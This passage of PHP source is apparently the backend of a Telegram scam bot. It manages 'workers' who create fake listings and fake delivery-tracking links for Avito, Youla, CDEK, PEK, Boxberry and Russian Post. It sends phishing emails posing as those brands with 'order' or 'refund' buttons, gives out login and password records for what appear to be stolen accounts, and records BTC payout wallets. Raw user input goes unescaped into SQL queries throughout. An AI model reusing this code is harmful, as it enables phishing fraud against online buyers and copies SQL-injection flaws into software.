							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;

					case 'SDK':
						$x = 0;
						$trackcodes = mysqli_query($connection, "SELECT * FROM `trackcodessdek` WHERE `worker` = '$user_id' AND `status` > '0'");
				
						if(mysqli_num_rows($trackcodes) > 0) {
							while($row = mysqli_fetch_assoc($trackcodes)) {
								$x = $x+1;
								
								$link = $links['cdek'].'/track/'.$row['code'];
								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
									$x,
									$link,
									$row['product'],
									$row['amount'],
									"СДЭК"
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/SDK')));
							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;

					case 'PEK':
						$x = 0;
						$trackcodes = mysqli_query($connection, "SELECT * FROM `trackcodespek` WHERE `worker` = '$user_id' AND `status` > '0'");
				
						if(mysqli_num_rows($trackcodes) > 0) {
							while($row = mysqli_fetch_assoc($trackcodes)) {
								$x = $x+1;
								
								$link = $links['pek'].'/track/'.$row['code'];
								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
									$x,
									$link,
									$row['product'],
									$row['amount'],
									"ПЭК"
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PEK')));
							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;

					case 'PST':
						$x = 0;
						$trackcodes = mysqli_query($connection, "SELECT * FROM `trackcodespost` WHERE `worker` = '$user_id' AND `status` > '0'");
						if(mysqli_num_rows($trackcodes) > 0) {
							while($row = mysqli_fetch_assoc($trackcodes)) {
								$x = $x+1;
								$link = $links['pochta'].'/track/'.$row['code'];
								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
									$x,
									$link,
									$row['product'],
									$row['amount'],
									"Почта России"
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PST')));
							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;
				}

				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => json_encode($keyboard)));	
			}

			if(preg_match('/\/getfreeavito\//', $callback['type'])){
				$check_last = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `free_history` WHERE `telegram` = '$callback[from]' ORDER by `id` DESC LIMIT 1"));
				$deltatime = time() - $check_last['time'];
				if($deltatime > 86400){
					$account = mysqli_query($connection, "SELECT * FROM `free` WHERE `status` = '0' AND `type` = '0' LIMIT 1");
					if(mysqli_num_rows($account) > 0){
						$account = mysqli_fetch_assoc($account);
						$text = str_replace("\t", "", sprintf($callbacks['free']['template'], $account['login'], $account['password'], $account['phone']));
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
						$time = time();
						mysqli_query($connection, "INSERT INTO `free_history`(`type`, `telegram`, `acc_id`, `time`) VALUES ('$account[type]','$callback[from]','$account[id]','$time')");
						mysqli_query($connection, "UPDATE `free` SET `status` = '1' WHERE `id` = '$account[id]'");
					}else{
						$text = sprintf($callbacks['free']['errors']['empty'], $callbacks['free']['type'][0]);
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
					}
				}else{
					$text = $callbacks['free']['errors']['limit'];
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
				}
			}

			if(preg_match('/\/getfreeyoula\//', $callback['type'])){
				$check_last = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `free_history` WHERE `telegram` = '$callback[from]' ORDER by `id` DESC LIMIT 1"));
				$deltatime = time() - $check_last['time'];
				if($deltatime > 86400){
					$account = mysqli_query($connection, "SELECT * FROM `free` WHERE `status` = '0' AND `type` = '1' LIMIT 1");
					if(mysqli_num_rows($account) > 0){
						$account = mysqli_fetch_assoc($account);
						$text = str_replace("\t", "", sprintf($callbacks['free']['template'], $account['login'], $account['password'], $account['phone']));
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
						$time = time();
						mysqli_query($connection, "INSERT INTO `free_history`(`type`, `telegram`, `acc_id`, `time`) VALUES ('$account[type]','$callback[from]','$account[id]','$time')");
						mysqli_query($connection, "UPDATE `free` SET `status` = '1' WHERE `id` = '$account[id]'");
					}else{
						$text = sprintf($callbacks['free']['errors']['empty'], $callbacks['free']['type'][1]);
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
					}
				}else{
					$text = $callbacks['free']['errors']['limit'];
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
				}
			}	
		}
		
		if(isset($message)) {

			$query = mysqli_query($connection, "SELECT `username` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");
			$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$message[from]'"));
			if($config['status'] == 0 AND $user['access'] < 666 AND substr($message['chat_id'], 0, 1) != '-'){
				send($config['token'], 'sendMessage', Array('chat_id' => $message["from"], 'text' => $callbacks['bot_off'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				die($callbacks['bot_off']);
			}

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);
				
				if($user['username'] != $message['username']) {
					mysqli_query($connection, "UPDATE `accounts` SET `username` = '$message[username]' WHERE `telegram` = '$message[from]'");
					
					$text = sprintf($callbacks['change_name'], $message['from'], $user['username'], $message['username']);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			// ====================== [ ЧАТ ВОРКЕРОВ ] ======================= //
			
			if($message['chat_id'] == $config['chat']['workers']) {
				if(isset($data->{'message'}->{'new_chat_member'})) {
					$query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");
					
					if(mysqli_num_rows($query) > 0) {
						$stake = explode(':', $settings['stake']);
						
						$text = str_replace("\t", "", sprintf($workers_chat['hello']['user'], 
							$message['from'], 
							$message['firstname']." ".$message['lastname'], 
							$config['invites']['payments'], 
							$stake[0], 
							$stake[1], 
							$settings['min_price'], 
							$settings['max_price']));

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						
						$text = sprintf($workers_chat['hello']['admin'], $message['from'], $message['firstname'], $message['lastname']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {
						if($message['from'] != 685118576 AND $message['from'] != 801438169) {
							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $message['from'], 'until_date' => time()+24*500*3600));
							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $message['from'], 'until_date' => time()+24*500*3600));
							
							$text = str_replace("\t", "", sprintf($workers_chat['kick'], $message['from'], $message['firstname'], $message['lastname']));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}
				
				if($message['chat_id'] == $config['chat']['workers'] AND isset($data->{'message'}->{'left_chat_member'})) {
					$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
					if($user['access'] < 666) {
						mysqli_query($connection, "UPDATE `accounts` SET `access` = '0' WHERE `telegram` = '$message[from]'");
						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $message['from'], 'until_date' => time()+24*500*3600));
						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $message['from'], 'until_date' => time()+24*500*3600));

						$text .= sprintf($workers_chat['leave'], $message['from'], $message['firstname'], $message['lastname']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {
						$text .= sprintf($workers_chat['kicked'], $message['from'], $message['firstname'], $message['lastname']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				}
				
			}
			
			// ==================== [ ЛИЧНЫЕ СООБЩЕНИЯ ] ===================== //
			
			if(substr($message['chat_id'], 0, 1) != '-') {
				$accounts = mysqli_query($connection, "SELECT `id`, `username`, `access`,`wallet` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");
				
				if(mysqli_num_rows($accounts) > 0) {
					$user = mysqli_fetch_assoc($accounts);
					
					if($user['username'] != $message['username']) {
						mysqli_query($connection, "UPDATE `accounts` SET `username` = '$message[username]' WHERE `telegram` = '$message[from]'");
						
						$text = sprintf($callbacks['change_name'], $message['from'], $user['username'], $message['username']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
					
					$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$tracks = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$dtracks = mysqli_query($connection, "SELECT * FROM `trackcodessdek` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$ptracks = mysqli_query($connection, "SELECT * FROM `trackcodespek` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$pstracks = mysqli_query($connection, "SELECT * FROM `trackcodespost` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$sendsmail = mysqli_query($connection, "SELECT * FROM `sendmails` WHERE `worker` = '$message[from]' AND `status` = '0' ORDER by `id` DESC");                                                                                                                                                               

					if(mysqli_num_rows($sendsmail) > 0){
						$sendmail = mysqli_fetch_assoc($sendsmail);
						if($sendmail['type'] == null){
							switch ($message['text']) {
								case $keyboards['sendmails'][0][0]:
									$type = '0';
								break;
								
								case $keyboards['sendmails'][0][1]:
									$type = '1';
								break;

								case $keyboards['sendmails'][0][2]:
									$type = '2';
								break;

								case $keyboards['sendmails'][1][0]:
									$type = '3';
								break;

								case $keyboards['sendmails'][1][1]:
									$type = '4';
								break;

								case $keyboards['sendmails'][1][2]:
									$type = '5';
								break;

								case $keyboards['back_button'][0][0]:
									$type = '-1';
								break;

								default:
									$text = $bot_chat['sendmails']['not_platform'];
									$type = '-1';
								break;
							}
							$check_last = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `time`,`id` FROM `sendmails` WHERE `worker` = '$message[from]' AND `status` = '1' AND `type` = '$type' ORDER by `id` DESC LIMIT 1"));
							$deltatime = time() - $check_last['time'];
							if($check_last['id'] == '' OR $deltatime > 300){
								if($type != '-1'){
									mysqli_query($connection, "UPDATE `sendmails` SET `type` = '$type' WHERE `worker` = '$message[from]' AND `status` = '0'");
									$text = $bot_chat['sendmails']['messages']["2"];
									$keyboard = json_encode(Array('keyboard' => $bot_chat['sendmails']['keyboard']["select_type"], 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								}else{
									mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}else{
								$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
								if($user['access'] >= 666){
									$keyboard = $adminKeyboard;
								}else{
									$keyboard = $defaultKeyboard;
								}
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['sendmails']['messages']["limit"], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
							}
						}elseif($sendmail['refund'] == null){
							switch ($message['text']) {
								case $bot_chat['sendmails']['keyboard']["select_type"][0][0]:
									$type = '0';
								break;
								
								case $bot_chat['sendmails']['keyboard']["select_type"][0][1]:
									$type = '1';
								break;

								default:
									$type = '-1';
								break;
							}
							if($type != '-1'){
								mysqli_query($connection, "UPDATE `sendmails` SET `refund` = '$type' WHERE `worker` = '$message[from]' AND `status` = '0'");
								unset($text);
								$text = $bot_chat['sendmails']['messages']['3'];
								switch ($sendmail['type']) {
									case '0':
										$bd_table = 'adverts';
										$bd_table_param = 'advert_id';
										$price_text = 'price';
										$title_text = 'title';
									break;
									
									case '1':
										$bd_table = 'adverts';
										$bd_table_param = 'advert_id';
										$price_text = 'price';
										$title_text = 'title';
									break;

									case '2':
										$bd_table = 'trackcodes';
										$bd_table_param = 'code';
										$price_text = 'amount';
										$title_text = 'product';
									break;

									case '3':
										$bd_table = 'trackcodessdek';
										$bd_table_param = 'code';
										$price_text = 'amount';
										$title_text = 'product';
									break;

									case '4':
										$bd_table = 'trackcodespek';
										$bd_table_param = 'code';
										$price_text = 'amount';
										$title_text = 'product';
									break;

									case '5':
										$bd_table = 'trackcodespost';
										$bd_table_param = 'code';
										$price_text = 'amount';
										$title_text = 'product';
									break;
								}
								if($bd_table == 'adverts'){
									$objects = mysqli_query($connection, "SELECT * FROM `$bd_table` WHERE `worker` = '$message[from]' AND `status` > '0' AND `type` = '$sendmail[type]'");
								}else{
									$objects = mysqli_query($connection, "SELECT * FROM `$bd_table` WHERE `worker` = '$message[from]' AND `status` > '0'");
								}
								
								$keyboard = Array('keyboard' => Array(
									
								), 
									'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE
								);
								
								if(mysqli_num_rows($objects) > 0){
									$x = 0;
									while($row = mysqli_fetch_assoc($objects)){
										$x++;
										$data = sprintf($bot_chat['sendmails']['template_advert'], $x, $row[$title_text], $row[$bd_table_param]);
										array_push($keyboard['keyboard'], Array(Array('text' => $data)));
									}
									array_push($keyboard['keyboard'], Array(Array('text' => $keyboards['back_button'][0][0])));
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
								}else{
									$keyboard = json_encode(Array('keyboard' => Array(Array($keyboards['back_button'][0][0])), 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['sendmails']['messages']['empty_adverts'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
									mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
								}
							}else{
								$text = $bot_chat['sendmails']['not_type'];
								$keyboard = json_encode(Array('keyboard' => Array(Array($keyboards['back_button'][0][0])), 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
							}
						}elseif($sendmail['advert_id'] == null){
							preg_match("/\d+\. .+ \(ID: (\d+)\)/", $message['text'], $result);
							switch ($sendmail['type']) {
								case '0':
									$bd_table = 'adverts';
									$bd_table_param = 'advert_id';
									$title_text = 'title';
								break;
								
								case '1':
									$bd_table = 'adverts';
									$bd_table_param = 'advert_id';
									$title_text = 'title';
								break;

								case '2':
									$bd_table = 'trackcodes';
									$bd_table_param = 'code';
									$title_text = 'product';
								break;

								case '3':
									$bd_table = 'trackcodessdek';
									$bd_table_param = 'code';
									$title_text = 'product';
								break;

								case '4':
									$bd_table = 'trackcodespek';
									$bd_table_param = 'code';
									$title_text = 'product';
								break;

								case '5':
									$bd_table = 'trackcodespost';
									$bd_table_param = 'code';
									$title_text = 'product';
								break;
							}
							if($bd_table == 'adverts'){
								$objects = mysqli_query($connection, "SELECT * FROM `$bd_table` WHERE `worker` = '$message[from]' AND `status` > '0' AND `$bd_table_param` = '$result[1]' AND `type` = '$sendmail[type]'");
							}else{
								$objects = mysqli_query($connection, "SELECT * FROM `$bd_table` WHERE `worker` = '$message[from]' AND `status` > '0' AND `$bd_table_param` = '$result[1]'");
							}
							if(mysqli_num_rows($objects) > 0){
								$objects = mysqli_fetch_assoc($objects);
								$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
								if($objects['worker'] == $message['from']){
									mysqli_query($connection, "UPDATE `sendmails` SET `advert_id` = '$result[1]' WHERE `worker` = '$message[from]' AND `status` = '0'");
									$keyboard = json_encode(Array('keyboard' => Array(Array($keyboards['back_button'][0][0])), 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
									$text = $bot_chat['sendmails']['messages']['4'];
								}else{
									$text = $bot_chat['sendmails']['messages']['invalid'];
									mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
								}
							}else{
								$text = $bot_chat['sendmails']['messages']['empty'];
								mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
							}
							
							if($keyboard){
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							}else{
								if($user['access'] >= 666){
									$keyboard = $adminKeyboard;
								}else{
									$keyboard = $defaultKeyboard;
								}
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							}
						}elseif($sendmail['email'] == null){
							if(preg_match("/^[a-zA-Z0-9_\-.]+@[a-zA-Z0-9]+\.[a-z]+/", $message['text']) == TRUE){
								$email = $message['text'];
								$object_id = $sendmail['advert_id'];
								$refund = $sendmail['refund'];
								switch ($sendmail['type']) {
									case '0':
										$bd_table = 'adverts';
										$bd_table_param = 'advert_id';
									break;
									
									case '1':
										$bd_table = 'adverts';
										$bd_table_param = 'advert_id';
									break;

									case '2':
										$bd_table = 'trackcodes';
										$bd_table_param = 'code';
									break;

									case '3':
										$bd_table = 'trackcodessdek';
										$bd_table_param = 'code';
									break;

									case '4':
										$bd_table = 'trackcodespek';
										$bd_table_param = 'code';
									break;

									case '5':
										$bd_table = 'trackcodespost';
										$bd_table_param = 'code';
									break;
								}
								
								switch ($bd_table) {
									case 'adverts':
										$advert = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `$bd_table` WHERE `advert_id` = '$object_id'"));
										if($advert['type'] == '0'){
											$template = 'avito';
											$login = $sendmails["avito"]["login"];
											$password = $sendmails["avito"]["password"];
											$from_mail = $sendmails["avito"]["login"];
											$header = "Avito - Инфoрмация пo зaкaзу №$advert[advert_id]";
											$from = "Avito";
										}else{
											$template = 'youla';
											$login = $sendmails["youla"]["login"];
											$password = $sendmails["youla"]["password"];
											$from_mail = $sendmails["youla"]["login"];
											$from = "Youla";
											$header = "Youla - Информация пo зaкaзу №$advert[advert_id]";
										}
										if($refund == '1'){
											$url = $links[$template].'/refund/'.$object_id;
											$type_order = "возврат";
											$btn_text = "Пeрeйти к вoзврaту cрeдств";
										}else{
											$url = $links[$template].'/buy/'.$object_id;
										
											$type_order = "заказа";
											$btn_text = "Пeрeйти к oфoрмлeнию зaкaзa";
										}
										$data = [
											'advert_link' 	=> $url,
											'btn_text'		=> $btn_text,
											'advert_name'	=> $advert['title'],
											'advert_price'	=> $advert['price'],
											'advert_img'	=> $advert['image'],
										];
									break;
									
									case 'trackcodes':
										$template = "boxberry";
										if($refund == '1'){
											$type_order = "возврат средств";
											$btn_text = "Перейти к возврату средств";
										}else{
											$type_order = "доставка";
											$btn_text = "Перейти к оформлению заказа";
										}

										$login = $sendmails["boxberry"]["login"];
										$password = $sendmails["boxberry"]["password"];
										$from_mail = $sendmails["boxberry"]["login"];
										$from = "Boxberry";
										$header = "Boxberry - Информация по заказу №$object_id";

										$url = $links['boxberry']."/track/".$object_id;

										$data = [
											'domain_link'	=> $links['boxberry'],
											'advert_id'		=> $object_id,
											'advert_link' 	=> $url,
											'type_order' 	=> $type_order,
											'btn_text'		=> $btn_text,
											'email' 		=> $email,
										];
									break;

									case 'trackcodessdek':
										$template = "cdek";
										if($refund == '1'){
											$type_order = "возврат средств";
											$btn_text = "Перейти к вoзврату средств";
										}else{
											$type_order = "доставка";
											$btn_text = "Перейти к oфoрмлeнию зaкaзa";
										}

										$login = $sendmails["cdek"]["login"];
										$password = $sendmails["cdek"]["password"];
										$from_mail = $sendmails["cdek"]["login"];
										$header = "СДЭК - Инфoрмaция пo зaкaзу №$object_id";
										$from = "СДЭК";

										$url = $links['cdek']."/track/".$object_id;
										$data = [
											'domain_link'	=> $links['cdek'],
											'advert_id'		=> $object_id,
											'advert_link' 	=> $url,
											'type_order' 	=> $type_order,
											'btn_text'		=> $btn_text,
											'email' 		=> $email,
										];
									break;

									case 'trackcodespek':
										$template = "pek";
										if($refund == '1'){
											$type_order = "возврат средств";
											$btn_text = "Перейти к возврату средств";
										}else{
											$type_order = "доставка";
											$btn_text = "Перейти к оформлению заказа";
										}

										$login = $sendmails["pek"]["login"];
										$password = $sendmails["pek"]["password"];
										$from_mail = $sendmails["pek"]["login"];
										$header = "ПЭК - Инфoрмaция пo зaкaзу №$object_id";
										$from = "ПЭК";

										$url = $links['pek']."/track/".$object_id;
										$data = [
											'domain_link'	=> $links['pek'],
											'advert_id'		=> $object_id,
											'advert_link' 	=> $url,
											'type_order' 	=> $type_order,
											'btn_text'		=> $btn_text,
											'email' 		=> $email,
										];
									break;

									case 'trackcodespost':
										$template = "pochta";
										if($refund == '1'){
											$type_order = "возврат средств";
											$btn_text = "Перейти к возврату средств";
										}else{
											$type_order = "доставка";
											$btn_text = "Перейти к оформлению заказа";
										}

										$login = $sendmails["pochta"]["login"];
										$password = $sendmails["pochta"]["password"];
										$from_mail = $sendmails["pochta"]["login"];
										$header = "Пoчта Рoссии - Инфoрмaция пo зaкaзу №$object_id";
										$from = "Пoчта Рoссии";

										$url = $links['pochta']."/track/".$object_id;
										$data = [
											'domain_link'	=> $links['pochta'],
											'advert_id'		=> $object_id,
											'advert_link' 	=> $url,
											'type_order' 	=> $type_order,
											'btn_text'		=> $btn_text,
											'email' 		=> $email,
										];
									break;
								}

								$loader = new Twig_Loader_Filesystem('email');
							  	$twig = new Twig_Environment($loader);
							  	$template = $twig->loadTemplate("$template.html");
							  	$content = $template->render($data);

							  	$mail = new PHPMailer;
								$mail->CharSet = 'utf-8';

								//$mail->SMTPDebug = 3;                               // Enable verbose debug output

								$mail->isSMTP();                                      // Set mailer to use SMTP
								$mail->Host = $sendmails['host'];  																							// Specify main and backup SMTP servers
								$mail->SMTPAuth = true;                               // Enable SMTP authentication
								$mail->Username = $login; // Ваш логин от почты с которой будут отправляться письма
								$mail->Password = $password; // Ваш пароль от почты с которой будут отправляться письма
								$mail->SMTPAutoTLS = false;
								//$mail->SMTPSecure = 'ssl';         // шифрование ssl
								//$mail->Port   = 465;  // TCP port to connect to / этот порт может отличаться у других провайдеров

								$mail->setFrom($from_mail, $from); // от кого будет уходить письмо?
								$mail->addAddress($email);     // Кому будет уходить письмо 
								$mail->isHTML(true);                                  // Set email format to HTML

								$mail->Subject = $header;
								$mail->Body    = $content;
								$mail->AltBody = 'None';
								if($mail->send()){
									$this_time = time();
									mysqli_query($connection, "UPDATE `sendmails` SET `status` = '1', `time` = '$this_time', `email` = '$email' WHERE `advert_id` = '$sendmail[advert_id]' AND `worker` = '$message[from]' AND `status` = '0'");
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['sendmails']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}else{
									$this_time = time();
									mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1', `time` = '$this_time', `email` = '$email' WHERE `advert_id` = '$sendmail[advert_id]' AND `worker` = '$message[from]' AND `status` = '0'");
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['sendmails']['messages']['fail'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}elseif ($message['text'] == $keyboards['back_button'][0][0]) {
								mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => "", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}else{
								mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['sendmails']['messages']['invalid_email'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					}
					
					if($user['wallet'] == "-2"){
						$data = json_decode(file_get_contents("https://blockchain.info/address/$message[text]?format=json"), 1);
						if(isset($data['hash160'])){
							mysqli_query($connection, "UPDATE `accounts` SET `wallet` = '$message[text]' WHERE `telegram` = '$message[from]'");
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['change_btc']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							mysqli_query($connection, "UPDATE `accounts` SET `wallet` = '-1' WHERE `telegram` = '$message[from]'");
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['change_btc']['fail'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}	
					}

					if(mysqli_num_rows($adverts) > 0) {
						$advert = mysqli_fetch_assoc($adverts);
						
						if(empty($advert['title'])) {
							if(preg_match("/http/", $message['text']) == FALSE AND $message['text'] != $keyboards['create_link'][0][0] AND $message['text'] != $keyboards['create_link'][0][1] AND $message['text'] != $keyboards['back_button'][0][0]) {
								if(mb_strlen($message['text']) >= 5 AND mb_strlen($message['text'] <= 90)) {
									mysqli_query($connection, "UPDATE `adverts` SET `title` = '$message[text]' WHERE `id` = '$advert[id]'");
									
									$text = str_replace("\t", "", $bot_chat['create_advert']['asks']['2']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $bot_chat['create_advert']['errors']['1'][0];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								if($message['text'] != $keyboards['back_button'][0][0]){
									$text = $bot_chat['create_advert']['errors']['1'][1];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}
						} elseif(empty($advert['date_delivery'])){
							if(mb_strlen($message['text']) >= 3 AND mb_strlen($message['text'] <= 90)) {
								mysqli_query($connection, "UPDATE `adverts` SET `date_delivery` = '$message[text]' WHERE `id` = '$advert[id]'");
								
								$text = $bot_chat['create_advert']['asks']['3'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat['create_advert']['errors']['2'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($advert['price'])) {
							if(preg_match('/^[0-9]{2,6}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
									mysqli_query($connection, "UPDATE `adverts` SET `price` = '$message[text]' WHERE `id` = '$advert[id]'");
									$text = $bot_chat['create_advert']['asks']['4'];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = sprintf($bot_chat['create_advert']['errors']['3'], $settings['min_price'], $settings['max_price']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = sprintf($bot_chat['create_advert']['errors']['3'], $settings['min_price'], $settings['max_price']);
